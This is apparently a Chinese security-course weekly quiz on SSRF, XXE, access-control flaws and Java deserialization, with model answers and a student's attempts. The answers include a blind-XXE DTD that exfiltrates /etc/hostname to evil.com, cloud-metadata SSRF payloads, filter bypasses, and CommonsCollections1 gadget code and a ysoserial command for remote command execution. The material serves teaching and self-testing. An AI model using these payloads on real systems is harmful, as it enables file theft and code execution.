# 第 1 周学习检测

> 本周内容：SSRF · XXE · 越权 · 反序列化

<link rel="stylesheet" href="../../../../asserts/css/test-style.css">
<script src="../../../../asserts/js/test-script.js" defer></script>

---

## 📊 自测打分表

<div class="test-card">
  <div class="test-score"><span>📊 基础分</span><span id="baseScore">0</span><span> / <span id="baseMax">85</span></span></div>
  <div class="test-score"><span>⭐ 含附加题</span><span id="totalScore">95</span><span> / <span id="totalMax">0</span></span></div>
  <div class="test-score"><span>🏆 评级</span><span id="rating">—</span></div>
  <button class="test-reset" id="resetBtn">🔄 重置</button>
</div>

| 题号 | 题型 | 分值 | 得分 |
|:----:|:----:|:----:|:----:|
| 一.1 | 选择题 | 4 | <input class="test-input" data-max="4" value="0"> |
| 一.2 | 选择题 | 4 | <input class="test-input" data-max="4" value="0"> |
| 一.3 | 选择题 | 4 | <input class="test-input" data-max="4" value="0"> |
| 一.4 | 选择题 | 4 | <input class="test-input" data-max="4" value="0"> |
| 一.5 | 选择题 | 4 | <input class="test-input" data-max="4" value="0"> |
| 二.1 | 简答题 | 8 | <input class="test-input" data-max="8" value="0"> |
| 二.2 | 简答题 | 8 | <input class="test-input" data-max="8" value="0"> |
| 二.3 | 简答题 | 8 | <input class="test-input" data-max="8" value="0"> |
| 二.4 | 简答题 | 8 | <input class="test-input" data-max="8" value="0"> |
| 二.5 | 简答题 | 8 | <input class="test-input" data-max="8" value="0"> |
| 三.1 | 漏洞分析 | 10 | <input class="test-input" data-max="10" value="0"> |
| 三.2 | 漏洞分析 | 10 | <input class="test-input" data-max="10" value="0"> |
| 四 | 安全设计 | 10 | <input class="test-input" data-max="10" value="0"> |
| 五 | 附加题 | 10 | <input class="test-input" data-max="10" data-bonus="true" value="0"> |

<div class="test-summary">
  <h4>📝 自测简记</h4>
  <textarea id="testNotes" rows="2" placeholder="记录丢分题号、需要复盘的知识点..."></textarea>
</div>

---

## 一、选择题（每题4分，共20分）

### 第1题

关于 SSRF 漏洞，下列说法错误的是？

A. SSRF的核心问题是服务器无条件信任用户提供的URL  
B. SSRF只能攻击内网HTTP服务，无法攻击其他协议  
C. 通过SSRF可以访问云服务器的元数据服务（如169.254.169.254）  
D. 重定向可以作为一种绕过SSRF防御的手段  

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案与解析</button>
  <div class="answer-content">
    <p><strong>答案：B</strong></p>
    <p><strong>解析：</strong></p>
    <ul>
      <li>A ✅ 正确。SSRF 的本质就是服务端无条件信任用户提供的 URL，并用自身身份发起请求。</li>
      <li>B ❌ 错误。SSRF 不仅可攻击 HTTP 服务，还可通过 file://、dict://、gopher:// 等协议读取本地文件、探测端口、攻击内网 Redis / MySQL 等。</li>
      <li>C ✅ 正确。云环境的元数据服务（如 AWS 169.254.169.254）是 SSRF 的高危目标。</li>
      <li>D ✅ 正确。如果服务端跟随重定向，可能绕过对原始 URL 的校验。</li>
    </ul>
  </div>
</div>

---

### 第2题

以下哪个 XML 声明可以正确读取 /etc/passwd（假设存在 XXE 漏洞）？

A. `<!ENTITY xxe SYSTEM "file:///etc/passwd">`  
B. `<!ENTITY % xxe SYSTEM "file:///etc/passwd">`  
C. `<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "/etc/passwd">]>`  
D. `<!ENTITY xxe "file:///etc/passwd">`  

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案与解析</button>
  <div class="answer-content">
    <p><strong>答案：A</strong></p>
    <p><strong>解析：</strong></p>
    <ul>
      <li>A ✅ 正确的外部实体定义，SYSTEM 表示外部资源，file:// 为本地文件协议。</li>
      <li>B ❌ 参数实体语法，通常用于 Blind XXE，但本题问的是"正确读取文件"。</li>
      <li>C ❌ 缺少 SYSTEM 或 PUBLIC 关键字，不是合法外部实体声明。</li>
      <li>D ❌ 内部实体只能定义静态字符串，不能读取外部文件。</li>
    </ul>
  </div>
</div>

---

### 第3题

关于越权漏洞，下列说法正确的是？

A. 只要用户通过身份认证，就不存在越权风险  
B. 隐藏URL（如/admin）是防御垂直越权的有效手段  
C. IDOR漏洞属于水平越权的一种  
D. 使用GUID代替数字ID可以完全防止水平越权  

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案与解析</button>
  <div class="answer-content">
    <p><strong>答案：C</strong></p>
    <p><strong>解析：</strong></p>
    <ul>
      <li>A ❌ 认证 ≠ 授权，认证通过后仍可能存在越权。</li>
      <li>B ❌ 隐藏 URL 不是有效防御，攻击者可通过目录爆破、JS 泄露等方式找到。</li>
      <li>C ✅ IDOR（不安全的直接对象引用）属于水平越权的典型场景。</li>
      <li>D ❌ GUID 不可枚举，但仍可能通过其他接口泄露或时间戳预测，不能完全杜绝越权。</li>
    </ul>
  </div>
</div>

---

### 第4题

关于 Java 反序列化漏洞，下列说法错误的是？

A. 反序列化时不会调用类的构造方法  
B. 如果一个类没有实现Serializable接口，它不能被序列化  
C. readObject()方法是反序列化漏洞的唯一入口  
D. transient修饰的字段不会被序列化  

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案与解析</button>
  <div class="answer-content">
    <p><strong>答案：C</strong></p>
    <p><strong>解析：</strong></p>
    <ul>
      <li>A ✅ 反序列化通过特殊机制创建对象，不调用构造方法。</li>
      <li>B ✅ 只有实现 Serializable 的类才能被 Java 原生序列化。</li>
      <li>C ❌ 错误。readObject() 是常见入口，但不是唯一入口。readExternal()、readResolve()，甚至 hashCode() / toString() 都可能成为链的一部分。</li>
      <li>D ✅ transient 字段默认不参与序列化。</li>
    </ul>
  </div>
</div>

---

### 第5题

在 CC1 链中，InvokerTransformer 的作用是？

A. 返回一个固定的常量  
B. 通过反射调用任意方法  
C. 串联多个Transformer  
D. 触发DNS查询  

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案与解析</button>
  <div class="answer-content">
    <p><strong>答案：B</strong></p>
    <p><strong>解析：</strong></p>
    <ul>
      <li>A ❌ ConstantTransformer 负责返回常量。</li>
      <li>B ✅ InvokerTransformer.transform() 通过反射调用任意方法，是命令执行的核心。</li>
      <li>C ❌ ChainedTransformer 负责串联。</li>
      <li>D ❌ URLDNS 链才涉及 DNS 查询。</li>
    </ul>
  </div>
</div>

---

## 二、简答题（每题8分，共40分）

### 第1题

简述 SSRF 和 XXE 之间的关系。在什么情况下可以用 XXE 实现 SSRF？

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <p><strong>答案要点：</strong></p>
    <p><strong>关系：</strong> XXE 可以触发 SSRF。当 XML 解析器支持外部实体且允许访问 HTTP/HTTPS 等协议时，攻击者可以在外部实体中指定内网 URL。两者本质都是"服务端发起意外请求"，XXE 是一种 SSRF 的触发载体。</p>
    <p><strong>利用条件：</strong></p>
    <ul>
      <li>应用程序解析用户可控的 XML 输入</li>
      <li>XML 解析器允许外部实体 + 允许 HTTP 协议</li>
      <li>如果响应不回显，可结合 Blind XXE + OAST</li>
    </ul>
    <p><strong>示例：</strong></p>
    <pre><code>&lt;!DOCTYPE foo [
  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
]&gt;
&lt;root&gt;&amp;xxe;&lt;/root&gt;</code></pre>
  </div>
</div>

---

### 第2题

写出至少 3 种绕过 SSRF 黑名单过滤的方法，并简要说明原理。

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <ul>
      <li><strong>进制/简写替换</strong>：127.0.0.1 有多种表示，如八进制 `017700000001`、简写 `127.1`</li>
      <li><strong>域名解析到内网</strong>：自建域名指向 127.0.0.1，如 `http://evil.com`</li>
      <li><strong>URL 编码/大小写</strong>：绕过简单字符串匹配，如 `http://LOCALHOST/%61dmin`</li>
      <li><strong>重定向绕过</strong>：先经过白名单域名，再 302 跳转到内网地址</li>
      <li><strong>嵌入凭据（@）</strong>：利用解析差异，如 `http://safe@127.0.0.1/admin`</li>
    </ul>
    <p>注：答出任意 3 种即可。</p>
  </div>
</div>

---

### 第3题

解释水平越权和垂直越权的区别，并各举一个真实场景中的例子。

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <ul>
      <li><strong>垂直越权</strong>：低权限用户 → 高权限操作（角色不同）。示例：普通用户访问 `/admin/deleteUser?id=123`</li>
      <li><strong>水平越权</strong>：相同角色，访问他人数据（用户不同）。示例：用户 A 修改 URL 中 `orderId=2`，查看用户 B 的订单</li>
    </ul>
    <p><strong>真实场景：</strong></p>
    <ul>
      <li>垂直：修改 Cookie 中 `role=user` → `role=admin`，进入后台。</li>
      <li>水平：修改 API 参数 `userId=1001` → `userId=1002`，查看他人信息（IDOR）。</li>
    </ul>
  </div>
</div>

---

### 第4题

简述 Java 反序列化漏洞产生的根本原因。为什么说"入口是安全的，危险的是类本身"？

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <p><strong>根本原因：</strong> 反序列化过程中，攻击者可以控制字节流中的字段值。某些类自定义了 readObject()，并在其中执行了危险操作（如反射、命令执行、JNDI 查找）。危险操作所使用的数据来自反序列化恢复的字段（攻击者可控）。</p>
    <p><strong>为什么"入口是安全的，危险的是类本身"：</strong></p>
    <ul>
      <li>ObjectInputStream.readObject() 本身只是一个标准机制，没有恶意代码。</li>
      <li>漏洞的根源在于某个类的 readObject() 中写了危险代码，且攻击者可控制关键参数。</li>
      <li>如果所有类的 readObject() 都是安全的，反序列化本身就不会有漏洞。</li>
    </ul>
  </div>
</div>

---

### 第5题

画出 URLDNS 链的完整调用链（从 readObject 到 DNS 查询）。

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <p><strong>调用链：</strong></p>
    <pre>
ObjectInputStream.readObject()
    ↓
HashMap.readObject()
    ↓
HashMap.putForCreate(key, value)
    ↓
HashMap.hash(key)
    ↓
key.hashCode()           ← key 是 URL 对象
    ↓
URL.hashCode()
    ↓
URLStreamHandler.hashCode(URL)
    ↓
getHostAddress()         ← 触发 DNS 解析
    ↓
InetAddress.getByName(host)</pre>
    <p><strong>一句话总结：</strong> HashMap 反序列化时遍历 key → 调用 key.hashCode() → URL.hashCode() 触发 DNS 查询。</p>
  </div>
</div>

---

## 三、漏洞分析题（每题10分，共20分）

### 第1题（XXE + SSRF 综合 Blind XXE）

你发现一个Web应用存在XXE漏洞，但服务端的响应中不返回任何实体内容（Blind XXE）。同时，你确认目标服务器可以出网。请设计一个完整的攻击方案，读取服务器上的 /etc/hostname 文件。

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <p><strong>1. 在自己的服务器上准备恶意 DTD 文件（如 http://evil.com/xxe.dtd）</strong></p>
    <pre><code>&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;
&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://evil.com/?data=%file;'&gt;"&gt;
%eval;
%exfil;</code></pre>
    <p><strong>2. 向目标服务器发送 payload</strong></p>
    <pre><code>&lt;?xml version="1.0"?&gt;
&lt;!DOCTYPE foo [
  &lt;!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd"&gt;
  %xxe;
]&gt;
&lt;root&gt;&lt;/root&gt;</code></pre>
    <p><strong>3. 获取数据</strong></p>
    <p>目标服务器会解析 DTD → 读取 /etc/hostname → 将内容拼接到 http://evil.com/?data=... → 向攻击者服务器发起请求。攻击者查看 Web 服务器访问日志，即可获得文件内容。</p>
  </div>
</div>

---

### 第2题（越权 + 反序列化综合）

某应用提供了一个API：POST /api/export，请求体接受一个序列化的Java对象，服务端会反序列化该对象并生成导出文件。你在代码审计中发现目标依赖了commons-collections 3.2.1。你的最终目标是在目标服务器上执行 `touch /tmp/pwned` 命令。

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <p><strong>1. 使用的 Gadget 链：</strong> CommonsCollections1 或 CommonsCollections5</p>
    <p><strong>2. 手工构造核心逻辑：</strong></p>
    <pre><code>// 1. 构造命令执行的 Transformer 链
Transformer[] transformers = {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, 
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, 
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec", new Class[]{String.class}, 
        new Object[]{"touch /tmp/pwned"})
};
ChainedTransformer chain = new ChainedTransformer(transformers);

// 2. 包装到 LazyMap
Map innerMap = new HashMap();
Map lazyMap = LazyMap.decorate(innerMap, chain);

// 3. 通过 AnnotationInvocationHandler 触发
Class&lt;?&gt; clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(Class.class, Map.class);
cons.setAccessible(true);
Object handler = cons.newInstance(Override.class, lazyMap);

// 4. 序列化 handler 并发送给目标</code></pre>
    <p><strong>3. 最终目标：</strong> 目标服务端反序列化该对象时 → 触发 LazyMap.get() → 调用 ChainedTransformer → 反射执行 Runtime.exec("touch /tmp/pwned")。</p>
  </div>
</div>

---

## 四、安全设计题（10分）

针对 SSRF、XXE、反序列化漏洞，提出具体的防御方案。

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <p><strong>SSRF 防御：</strong></p>
    <ul>
      <li>白名单限制 URL：只允许访问业务必需的域名/IP，从根本上阻止内网探测</li>
      <li>禁用重定向跟随：防止通过合法域名 → 302 → 内网的绕过</li>
    </ul>
    <p><strong>XXE 防御：</strong></p>
    <ul>
      <li>禁用外部实体：在解析器中设置禁止外部实体，直接从源头禁止</li>
      <li>使用 JSON 替代 XML：从数据格式层面消除 XXE 风险</li>
    </ul>
    <p><strong>反序列化防御：</strong></p>
    <ul>
      <li>反序列化白名单：只允许序列化特定类，拒绝恶意 Gadget 链中的类</li>
      <li>不反序列化不可信数据：最彻底的防御——不信任外部输入</li>
    </ul>
  </div>
</div>

---

## 五、附加题（10分）

CC1链中为什么要使用“两层AnnotationInvocationHandler”嵌套？如果不使用动态代理，能否触发LazyMap.get()？

<div class="answer-fold">
  <button class="answer-btn">📖 查看答案</button>
  <div class="answer-content">
    <p><strong>为什么用两层嵌套？</strong></p>
    <ul>
      <li>第一层 handler1：memberValues 为 LazyMap，负责触发 factory.transform()</li>
      <li>第二层 handler2：memberValues 为 proxyMap（动态代理），负责在 readObject 遍历 entrySet() 时，将调用转发给 handler1.invoke()，进而调用 LazyMap.get()</li>
    </ul>
    <p><strong>不代理能否触发？不能。</strong></p>
    <p>因为 AnnotationInvocationHandler.readObject() 中遍历的是 memberValues.entrySet()。如果直接放 LazyMap，虽然 entrySet() 会被调用，但不会自动调用 LazyMap.get()。动态代理的作用：任何对 proxyMap 的方法调用都会被转发给 handler1.invoke()，而 invoke() 内部会调用 memberValues.get()，从而进入 LazyMap.get()。</p>
  </div>
</div>

---

## 📌 附录：常见漏洞分类速查

| 漏洞类型 | 核心问题 | 利用条件 |
|---------|----------|----------|
| SSRF | 服务端请求可控URL | 用户控制URL参数 + 服务端发起请求 |
| XXE | 解析XML + 外部实体 | 解析XML输入 + 允许外部实体 |
| 越权 | 未授权访问 | 认证后修改参数访问他人数据 |
| Java反序列化 | 反序列化恶意字节流 | 存在Gadget链 + 可控输入 |



## 作答
### 选择
1. B
2. AB?
3. C
4. C
5. B
### 简答
1. SSRF是XXE的一种利用方式，当服务器存在XXE漏洞同时攻击者可以指定注入的实体为内网地址时攻击者可以通过让漏洞服务器访问内网，然后通过XXE漏洞将内网敏感数据带出
   ```xml
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "[file://etc/passwd](http://169.254.169.254/latest/meta-data/)">
    ]>
    <foo>&xxe;</foo>
   ``` 
2. 大小写绕过，二次编码绕过，DNS域名解析绕过，重定向绕过，进制转换绕过
3. 水平越权是指从一个用户能够访问另一个同等级的用户的数据，主要是数据分离做的不够好；垂直越权是指用一个低权限的身份能够访问高权限的接口执行高权限操作
    真实场景：垂直：修改 Cookie 中 `role=user` → `role=admin`，进入后台。水平：修改 API 参数 `userId=1001` → `userId=1002`，查看他人信息（IDOR）
4. 根本原因：用户能够控制序列化的对象的某些字段值从而构造方法调用链，在反序列化是执行恶意指令
    因为入口本身是没有任何恶意操作的，但是经过类重写后可能就会出现导致最后恶意操作的方法调用
5. 调用链
   ```
   ObjectInputStream.readObject()
   |
   HashMap.readObject()
   |
   HashMap.putForCreate(key,value)
   |
   HashMap.hash(key)
   |
   key.hashCode()
   |
   URL.hasnCode()
   |
   getHostAddresse()    <---触发DNS解析
   |
   InetAddress.getByName(host)
   ``` 
### 漏洞分析
1. 第1题（XXE + SSRF 综合 Blind XXE）
   1. 首先目标服务器可以出网，让目标服务器读取攻击者控制的主机上的恶意外部DTD文件进行外部实体注入,然后blind xxe无回显可以使用报错回显
   2. 恶意DTD文件payload
      ```dtd
        <!ENTITY % file SYSTEM "file:///etc/hostname">
        <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///error/%file;'>">
        %eval;
        %error;
      ```
   3. 让目标服务器去请求恶意dtd文件进行外部实体注入
      ```
        <!DOCTYPE foo
        [<!ENTITY %xxe SYSTEM "http://攻击者服务器地址/恶意dtd文件">
        %xxe;
        ]>
      ``` 
2. 第2题（越权 + 反序列化综合）
   1. 利用cc1链
      ```
      ObjectInputStream.readObject()
      |
      handler2.readObject()         <--handler2的memberValues为proxyMap
      |
      handler1.invoke()    <--代理转发给handler1，handler1的memberValues是LazyMap
      |
      LazyMap。get()
      |
      factory.transform
      |
      ChainedTransformer.transform()
      |
      ConstantTransformer.transform()
      |
      InvokerTransformer.transform()
      ```
   2. 手搓poc或者用ysoserial工具生成payload`java -jar ysoserial.jar Commons-Collections1 "touch /tmp/pwned" > payload.ser`
   3. 根据http请求决定是否进行base64编码，将payload放入请求体中，发送请求，完成攻击

### 安全设计
1. SSRF：白名单过滤，禁止重定向，进出站规则加强
2. 禁止外部实体注入
3. 只允许反序列化白名单中的安全类，不允许用户控制字段的值
### 附加题
外层handler2，memberValues 是proxyMap，当调用代理的任何方法都会被拦截转发给内层handler1调用handler1.invoke(),内存handler1，memberValues 是LazyMap会调用LazyMap.get()从而触发factory.transform()
不能：因为 AnnotationInvocationHandler.readObject() 中遍历的是 memberValues.entrySet()。如果直接放 LazyMap，虽然 entrySet() 会被调用，但不会自动调用 LazyMap.get()。动态代理的作用：任何对 proxyMap 的方法调用都会被转发给 handler1.invoke()，而 invoke() 内部会调用 memberValues.get()，从而进入 LazyMap.get()。